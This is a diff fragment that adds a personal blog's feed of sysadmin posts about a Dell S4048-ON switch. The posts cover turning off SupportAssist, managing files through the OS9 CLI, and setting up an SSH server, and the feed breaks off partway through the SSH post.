+&lt;p&gt;So I wand to disable this. I would try running this command (in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONF&lt;/code&gt; mode):&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell# conf
+Dell(conf)# eula-consent support-assist reject
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result will be:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I do not accept the terms of the license agreement. The SupportAssist feature has
+been deactivated and can no longer be used.
+To enable SupportAssist configurations, accept the terms of the license agreement
+by configuring this command 'eula-consent support-assist accept'.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;check-the-status&quot;&gt;Check the status&lt;/h2&gt;
+
+&lt;p&gt;If you enter the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show eula-consent support-assist&lt;/code&gt; you will see a status (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rejected&lt;/code&gt;) of this feature:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell# show eula-consent support-assist
+
+SupportAssist EULA has been: Rejected
+
+Additional information about the SupportAssist EULA is as follows:
+
+By installing SupportAssist, you allow Dell EMC to save your contact information
+(e.g. name, phone number and/or email address) which would be used to provide
+technical support for your Dell EMC products and services.  Dell EMC may use the information
+for providing recommendations to improve  your IT infrastructure.
+
+Dell EMC SupportAssist also collects and stores machine diagnostic information, which
+may include but is not limited to configuration information, user supplied contact
+information, names of data volumes, IP addresses, access control lists, diagnostics &amp;amp;
+performance information, network configuration information, host/server configuration
+&amp;amp; performance information and related data (&quot;Collected Data&quot;) and transmits this
+information to Dell EMC. By downloading SupportAssist and agreeing to be bound by these
+terms and the Dell EMC end user license agreement, available at: https://i.dell.com
+/sites/doccontent/legal/terms-conditions/en/Documents/E-EULA_01June2018.pdf,
+you agree to allow Dell EMC to provide remote monitoring services of your IT environment
+and you give Dell EMC the right to collect the Collected Data in accordance with Dell EMC's
+Privacy Policy, available at: https://www.dell.com/learn/us/en/uscorp1
+/policies-privacy-country-specific-privacy-policy, in order to
+enable the performance of all of the various functions of SupportAssist during your
+entitlement to receive related repair services from Dell EMC. You further agree to
+allow Dell EMC to transmit and store the Collected Data from SupportAssist in accordance
+with these terms. You agree that the provision of SupportAssist may involve
+international transfers of data from you to Dell EMC and/or to Dell EMC's affiliates,
+subcontractors or business partners. When making such transfers, Dell EMC shall ensure
+appropriate protection is in place to safeguard the Collected Data being transferred
+in connection with SupportAssist. If you are downloading SupportAssist on behalf
+of a company or other legal entity, you are further certifying to Dell EMC that you
+have appropriate authority to provide this consent on behalf of that entity. If you
+do not consent to the collection, transmission and/or use of the Collected Data,
+you may not download, install or otherwise use SupportAssist.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This short post that could be packed in one command.
+But I want to point an importance of security.
+Any communication with external system might be used as a back-door attacker.
+The SupportAssist has have a vulnerability in the past. Read the &lt;a href=&quot;https://xakep.ru/2019/06/24/supportassist/&quot;&gt;post&lt;/a&gt; about it.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dell.com/community/Networking-General/MXL-how-to-get-rid-of-the-nag-about-Support-Assist/td-p/5037926&quot;&gt;MXL - how to get rid of the nag about Support Assist&lt;/a&gt; - user question on the Dell forum about the same&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dell.com/support/manuals/us/en/19/force10-s4048-on/s4048-on-9.14.0.0-cli/about-this-guide&quot;&gt;Dell Command Line Reference Guide for the S4048–ON System&lt;/a&gt; - dell man page included full command list&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="sysad" /><category term="dell" /><category term="networks" /><category term="security" /><summary type="html">SupportAssist is a daemon for sending technical reports to Dell servers. It enables by default. Here we disable this unwanted feature (and may be unsecured).</summary></entry><entry><title type="html">DELL. File Management on S4048 switch (OS9-series system)</title><link href="https://gainanov.pro/eng-blog/sysad/dell-file-management/" rel="alternate" type="text/html" title="DELL. File Management on S4048 switch (OS9-series system)" /><published>2020-07-19T00:00:00+03:00</published><updated>2020-07-19T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/sysad/dell-file-management</id><content type="html" xml:base="https://gainanov.pro/eng-blog/sysad/dell-file-management/">&lt;p&gt;This article I will continue speaking about DELL PowerSwitch &lt;a href=&quot;https://i.dell.com/sites/doccontent/shared-content/data-sheets/en/Documents/Dell-EMC-Networking-S4048-ON-Spec-Sheet.pdf&quot;&gt;S4048-ON&lt;/a&gt;.
+Recently have been showed a many helpful commands for working in console.
+There is I want to say more about file system and files management on this switch series.&lt;/p&gt;
+
+&lt;h2 id=&quot;local-and-remote-file-system&quot;&gt;Local and remote file system&lt;/h2&gt;
+
+&lt;p&gt;The Dell Networking system can use the internal Flash, external Flash, or remote devices to store files.
+Rename, delete, and copy files on the system from EXEC Privilege mode.
+The system stores files on the &lt;strong&gt;internal Flash&lt;/strong&gt; by default but can be configured to store files elsewhere.&lt;/p&gt;
+
+&lt;h3 id=&quot;show-file-systems&quot;&gt;show file-systems&lt;/h3&gt;
+
+&lt;p&gt;To view file system information, use the following command - .&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# show file-systems
+
+      Size(b)     Free(b)      Feature      Type   Flags  Prefixes
+   2368282624  2304512000        FAT32 USERFLASH      rw  flash:
+            -           -  unformatted USERFLASH      rw  fcmfs:
+    218103808    64708608      Unknown  NFSMOUNT      rw  nfsmount:
+            -           -            -   network      rw  ftp:
+            -           -            -   network      rw  tftp:
+            -           -            -   network      rw  scp:
+            -           -            -   network      rw  http:
+            -           -            -   network      rw  https:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;operations-with-local-filesystem&quot;&gt;Operations with local Filesystem&lt;/h2&gt;
+
+&lt;h3 id=&quot;dir&quot;&gt;dir&lt;/h3&gt;
+
+&lt;p&gt;Display the files in a file system. The default is the current directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# dir
+
+Directory of flash:
+
+  1  drwx       4096   Jan 01 1980 00:00:00 +00:00 .  
+  2  drwx       3580   Jul 18 2020 22:09:12 +00:00 ..  
+  3  drwx       4096   Dec 10 2019 14:49:54 +00:00 TRACE_LOG_DIR  
+  4  drwx       4096   Dec 10 2019 14:49:54 +00:00 CONFD_LOG_DIR  
+  5  drwx       4096   Dec 10 2019 14:49:54 +00:00 CORE_DUMP_DIR  
+  6  d---       4096   Dec 10 2019 14:49:54 +00:00 ADMIN_DIR  
+  7  drwx       4096   Dec 10 2019 14:49:54 +00:00 RUNTIME_PATCH_DIR  
+  8  -rwx          1   Jul 03 2020 22:54:24 +00:00 boots.txt  
+  9  drwx       4096   Jul 14 2020 15:28:26 +00:00 CONFIG_TEMPLATE  
+ 10  -rwx          0   Jul 14 2020 15:28:56 +00:00 pdtrc.lo0  
+ 11  -rwx       4276   Jul 14 2020 15:29:04 +00:00 last-cold-st-config  
+ 12  -rwx       4435   Jul 03 2020 23:45:50 +00:00 startup-config  
+ 13  -rwx     314038   Jul 03 2020 23:45:54 +00:00 confd_cdb.tar.gz  
+ 14  -rwx         56   Jul 03 2020 23:45:54 +00:00 confd_cdb.tar.gz.version  
+ 15  -rwx          0   Jul 14 2020 15:28:26 +00:00 earlyCliParserDbg  
+
+flash: 2368282624 bytes total (2304438272 bytes free)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;mkdirrmdir&quot;&gt;mkdir/rmdir&lt;/h3&gt;
+
+&lt;p&gt;To create a directory on file system uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt;, to remove - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rmdir&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# mkdir tmp_dir
+
+DellEMC# dir tmp_dir
+Directory of flash:/tmp_dir
+
+  1  drwx       4096   Jul 18 2020 22:35:30 +00:00 .  
+  2  drwx       4096   Jan 01 1980 00:00:00 +00:00 ..  
+
+DellEMC# rmdir tmp_dir
+Proceed to remove the directory [confirm yes/no]: y   
+
+DellEMC# dir tmp_dir  
+% Error: The specified file or directory does not exist.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cdpwd&quot;&gt;cd/pwd&lt;/h3&gt;
+
+&lt;p&gt;To change the default directory, use the following command.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Display the current working directory.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;copy&quot;&gt;copy&lt;/h3&gt;
+
+&lt;p&gt;Copy one file to another location.
+Dell EMC Networking OS supports IPv4 and IPv6 addressing for FTP, HTTP, TFTP, and SCP (in the hostip field).&lt;/p&gt;
+
+&lt;p&gt;Syntax: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy source-file-url destination-file-url&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# copy startup-config startup-config.2
+!
+4435 bytes successfully copied
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;rename&quot;&gt;rename&lt;/h3&gt;
+
+&lt;p&gt;Rename a file in the local file system.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# rename startup-config.2 startup-config.3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;show-file&quot;&gt;show file&lt;/h3&gt;
+
+&lt;p&gt;To show a content of text file use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show file&lt;/code&gt; command. It will print a file into stdout of console. Example:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# show file startup-config.3
+
+! Version 9.13(0.1)
+! Last configuration change at Fri Jul  3 23:43:25 2020 by default
+! Startup-config last updated at Fri Jul  3 23:45:50 2020 by default
+!
+boot system stack-unit 1 primary system: A:
+boot system stack....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;delete&quot;&gt;delete&lt;/h3&gt;
+
+&lt;p&gt;Delete a file from the flash. After deletion, files cannot be restored.&lt;/p&gt;
+
+&lt;p&gt;Syntax: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delete [flash://]filepath [no-confirm]&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no-confirm&lt;/code&gt; - does not require user input for each file prior to deletion.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# delete flash://startup-config.2
+Proceed to delete startup-config.2 [confirm yes/no]: y
+
+DellEMC# delete startup-config.3 no-confirm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;save&quot;&gt;save&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;save&lt;/code&gt; command save the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show&lt;/code&gt; command into file on flash memory.
+The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;save&lt;/code&gt; entry must always be the last option.&lt;/p&gt;
+
+&lt;p&gt;For example:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# show command-history | save flash://command-history.txt
+Start saving show command report .......
+
+DellEMC# dir command-history.txt
+Directory of flash:
+  1  -rwx      76096   Jul 18 2020 22:30:16 +00:00 command-history.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;copy-file-fromto-remote-network-device&quot;&gt;Copy file from/to remote network device&lt;/h2&gt;
+
+&lt;p&gt;Files can be copied from many places. You should input the URL to desired place.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;: ftp://userid:password@hostip/filepath&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;: http://hostip/filepath&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nfsmount&lt;/code&gt;: nfsmount://&lt;mount-point&gt;/filepath&lt;/mount-point&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt;: scp://userid:password@hostip/filepath&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tftp&lt;/code&gt;: tftp://hostip/filepath&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;When copying a file to a remote location (for example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt;), enter only the keywords and DellOS prompts you need for the rest of the information. For example, you can enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy running-config scp:&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To copy a file to NFS server the remote directory need to be mounted. Use a command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount nfs&lt;/code&gt;. For example, mount nfs&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# mount nfs 192.168.101.2:/dell_shared /dell_shared
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Examples:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Copy from remote system to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flash:&lt;/code&gt; by SCP
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# copy scp://admin:some_strong_password@192.168.101.2/firmware.bin  flash://firmware.bin
+!
+65059 bytes successfully copied
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Copy back (from local to remote)
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# copy running-config scp://admin:some_strong_password@192.168.101.2/
+!
+4324 bytes successfully copied
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;verify&quot;&gt;verify&lt;/h3&gt;
+
+&lt;p&gt;Validate a file on the flash drive after it has been transferred to the system.&lt;/p&gt;
+
+&lt;p&gt;Syntax: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verify {md5|sha256} file [hash-value]&lt;/code&gt;
+Parameters:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5&lt;/code&gt; - to use the MD5 message-digest algorithm.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sha256&lt;/code&gt; - to use the SHA256 Secure Hash Algorithm&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; - a filename that will verified&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash-value&lt;/code&gt; - the hash that has gotten on the remote system&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# verify md5 firmware.bin 4659f3b278b52fb09c7ed759b2f10474
+MD5 hash VERIFIED for firmware.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;As you can see above many of Dell commands seems on Unix shell commands.
+In this post I would like to save in the “memory” my experience in file management Operations.
+I test it on the Dell Networking OS9 switch, so it helps you easy find a desired command in one page.
+This quick and small manual to work with files, firmware and cofigs without handling big official papers.
+Besides to know more about this commands see the links in the next section.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dell.com/support/article/en-us/how10841/how-to-manage-files-copy-and-delete-on-dell-networking-force10-switches?lang=en&quot;&gt;How to manage files (Copy and Delete) on Dell Networking Force10 switches&lt;/a&gt; - some short note about managing files on Dell site&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dell.com/support/home/en-us/product-support/product/force10-s4048-on/docs&quot;&gt;PowerSwitch S4048-ON Documentation&lt;/a&gt; - a page that consists all documentation for the 10G switch of Dell company&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://i.dell.com/sites/doccontent/shared-content/data-sheets/en/Documents/Dell-EMC-Networking-S4048-ON-Spec-Sheet.pdf&quot;&gt;DELL EMC NETWORKING S4048-ON SWITCH&lt;/a&gt; - Dell spec sheet for S4048–ON switch&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://topics-cdn.dell.com/pdf/force10-s4048-on_administrator-guide7_en-us.pdf&quot;&gt;Dell Command Line Reference Guide for the S4048–ON System&lt;/a&gt; - Dell man page included full command list&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://topics-cdn.dell.com/pdf/force10-s4048-on_administrator-guide8_en-us.pdf&quot;&gt;Dell Configuration Guide for the S4048–ON System&lt;/a&gt; - almost two thousands pages about configuration of Dell switch&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="sysad" /><category term="dell" /><category term="networks" /><summary type="html">Some useful notes for working with files (save, copy and transfer) on Dell Networking system.</summary></entry><entry><title type="html">DELL. Setup SSH server on OS9 switch (S4048 10G switch)</title><link href="https://gainanov.pro/eng-blog/sysad/dell-ssh-server-configure/" rel="alternate" type="text/html" title="DELL. Setup SSH server on OS9 switch (S4048 10G switch)" /><published>2020-07-19T00:00:00+03:00</published><updated>2020-08-08T03:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/sysad/dell-ssh-server-configure</id><content type="html" xml:base="https://gainanov.pro/eng-blog/sysad/dell-ssh-server-configure/">&lt;p&gt;Yet another technical post about DELL PowerSwitch &lt;a href=&quot;https://i.dell.com/sites/doccontent/shared-content/data-sheets/en/Documents/Dell-EMC-Networking-S4048-ON-Spec-Sheet.pdf&quot;&gt;S4048-ON&lt;/a&gt; that I am configuring.&lt;/p&gt;
+
+&lt;p&gt;Secure shell (SSH) is a protocol for secure remote login and other secure network services over an insecure network.
+Dell Networking OS is compatible with SSH versions 1.5 and 2, in both the client and server modes.
+SSH sessions are encrypted and use authentication.&lt;/p&gt;
+
+&lt;p&gt;The RSA-SSH authentication permits the user to establish an SSH session without entering a password.
+This allows the user to use a custom script, for example, to automatically launch an SSH session to a Force10 switch, eliminating the potential security vulnerability of including a password in the script.&lt;/p&gt;
+
+&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;
+
+&lt;p&gt;If you just unpack you will get an empty switch that does not listen any network connection.
+Firstly you should get a console cable. My switch has a micro USB interface on &lt;a href=&quot;https://www.dell.com/support/manuals/us/en/04/networking-s4048t-on/s4048t-on-ig-pub/micro-usb-b-console-port-access?guid=guid-e873c8e3-5514-4cc5-b457-35f074d44fa2&amp;amp;lang=en-us&quot;&gt;front-panel&lt;/a&gt; for console connection.
+So I’m plug-in a usual USB cable into this port, then install a &lt;a href=&quot;https://www.dell.com/support/home/en-us/drivers/driversdetails/?driverid=r5k9d&quot;&gt;drivers&lt;/a&gt; for COM-ports and connect to the switch with this settings:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;115200-baud rate
+No parity
+8 data bits
+1 stop bits
+No flow control
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you have seen an input invitation like this:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;You can start to configure a network interfaces and SSH server.&lt;/p&gt;
+
+&lt;h2 id=&quot;create-user&quot;&gt;Create user&lt;/h2&gt;
+
+&lt;p&gt;Enter to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONF&lt;/code&gt; mode with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conf&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;Create a user with name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and privilege level &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;15&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;password&amp;gt;&lt;/code&gt; enter the strong password here).&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell(config)# username admin password &amp;lt;password&amp;gt; privilege 15
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The &lt;a href=&quot;https://www.dell.com/support/manuals/us/en/19/force10-s4048-on/s4048_on_9.9.0.0_config_pub-v1/configuring-privilege-levels?guid=guid-2fa480e0-1660-41d8-8ac2-45aa90d5bb71&amp;amp;lang=en-us&quot;&gt;privilege level&lt;/a&gt; need to restrict access to commands.
+This level should between from 0 to 15. The default privilege level is 1.&lt;br /&gt;
+The user with privilege level 15 is like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; without any restrictions.
+It allows to access to the system begins at EXEC &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privilege&lt;/code&gt; mode, and all commands are available.&lt;/p&gt;
+
+&lt;h2 id=&quot;configure-management-interface&quot;&gt;Configure Management interface&lt;/h2&gt;
+
+&lt;p&gt;A Management interface need to remote configure and run commands on the switch.
+It use static or dynamic IP address.&lt;/p&gt;
+
+&lt;p&gt;Let’s add an IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.0.1/24&lt;/code&gt; to the first management interface. Then enable it and exit.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell(config)# interface managementethernet 1/1
+Dell(conf-if-ma-0/0)# ip add 10.0.0.1/24
+Dell(conf-if-ma-0/0)# no shutdown
+Dell(conf-if-ma-0/0)# exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;configure-ssh-server&quot;&gt;Configure SSH server&lt;/h2&gt;
+
+&lt;h3 id=&quot;enable-ssh&quot;&gt;Enable SSH&lt;/h3&gt;
+
+&lt;p&gt;Just input this command&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell(config)# ip ssh server enable
+Dell(config)# ip ssh server version 2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;generate-keys&quot;&gt;Generate keys&lt;/h3&gt;
+
+&lt;p&gt;Generate keys for the SSH server&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell(config)# crypto key generate rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;enable-password-auth&quot;&gt;Enable password auth&lt;/h3&gt;
+
+&lt;p&gt;Enable a password authentication&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell(config)# ip ssh password-authentication enable
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;enable-ssh-rsa-password-auth&quot;&gt;Enable SSH-RSA password auth&lt;/h3&gt;
+
+&lt;p&gt;Enable a RSA authentication&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell(config)# ip ssh rsa-authentication enable
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Copy your public part of RSA-key (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh/id_rsa.pub&lt;/code&gt;) into internal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flash://&lt;/code&gt; memory from remote host (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.0.3&lt;/code&gt;)&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell# copy scp://username:password@10.0.0.3/.ssh/id_rsa.pub flash://id_rsa.pub
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add authentication with this key&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell# ip ssh rsa-authentication my-authorized-keys flash://id_rsa.pub
+
+Creating ADMIN_DIR/ssh
+RSA keys added to user's list of authorized-keys.
+Delete the file flash://id_rsa.pub : (yes/no) ? yes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;try-to-connect&quot;&gt;Try to connect&lt;/h3&gt;
+
